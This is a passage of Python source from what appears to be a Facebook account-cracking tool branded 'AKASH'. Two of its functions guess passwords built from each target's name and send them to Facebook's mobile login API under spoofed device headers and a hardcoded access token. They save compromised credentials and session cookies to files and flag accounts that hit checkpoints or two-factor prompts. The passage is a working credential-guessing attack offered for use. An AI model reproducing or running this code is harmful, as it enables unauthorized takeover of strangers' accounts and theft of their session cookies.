                sys.stdout.write(f'\r\r {R}({G}AKASH{R}-{G}M2{R}) {W}%s{R}|{G}%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        en = random.choice(['en_US','en_GB'])
                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])
                        ua ='Davik/2.1.0 (Linux; U; Android 7.0.0; MMB29K Build/GT-P5100 [FBAN/FB4A;FBAV/241.0.0.41292;FBBV/975202462;FBDM/{density=2.75,width=720,height=9398};FBLC/pl_PL;FBCR/T-Mobile.pl;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.mlite;FBDV/MMB29K;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
                        headers = {"Content-Type": "application/x-www-form-urlencoded","Host": "graph.facebook.com","User-Agent": ua,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "MOBILE.LTE","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [AKASH-OK] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/AKASH-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/AKASH-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[AKASH-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;205m [AKASH-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/AKASH-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/AKASH-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                        else:
                                        continue
                loop+=1
        except Exception as e:
                pass
#=========[ FILE-METHOD-3 ]==========#
def api3(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write(f'\r\r {R}({W}AKASH{R}-{G}M3{R}) {W}%s{R}|{G}%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=3.0,width=1440,height=8797};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                "adid": adid,
"format": "json",
"device_id": str(uuid.uuid4()),
"email": ids,
"password": pas,
"generate_analytics_claims": "1",
"credentials_type": "password",
"source": "login",
"error_detail_type": "button_with_disabled",
"enroll_misauth": "false",
"generate_session_cookies": "1",
"generate_machine_id": "1",
"fb_api_req_friendly_name": "authenticate",}
                        headers={
                                "Accept-Encoding": "gzip, deflate",
"Accept": "*/*",
"Connection": "keep-alive",
"User-Agent": ua,
"Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
"X-FB-Friendly-Name": "authenticate",
"X-FB-Connection-Type": "unknown",
"Content-Type": "application/x-www-form-urlencoded",
"X-FB-HTTP-Engine": "Liger",
"Content-Length": "329",}
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [AKASH-OK] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print("Cookie: "+coki)
                                        open('/sdcard/AKASH-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/AKASH-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[AKASH-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;205m [AKASH-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/AKASH-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/AKASH-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                        else:
                                        continue
                loop+=1
        except Exception as e:
                pass
AKASH()